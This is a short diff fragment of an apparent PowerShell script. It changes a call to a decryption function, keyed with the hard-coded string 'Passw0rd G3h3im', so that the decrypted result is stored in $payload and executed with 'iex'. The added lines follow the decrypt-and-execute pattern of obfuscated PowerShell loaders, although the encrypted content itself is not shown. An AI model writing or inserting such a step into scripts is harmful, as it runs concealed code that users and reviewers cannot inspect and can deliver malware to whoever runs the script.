@@ -18,4 +18,5 @@ $j.Close();
 $f.Clear();
 return $encoding.GetString($h,0,$h.Length);
 }
-de Passw0rd G3h3im
+$payload = de Passw0rd G3h3im
+iex $payload
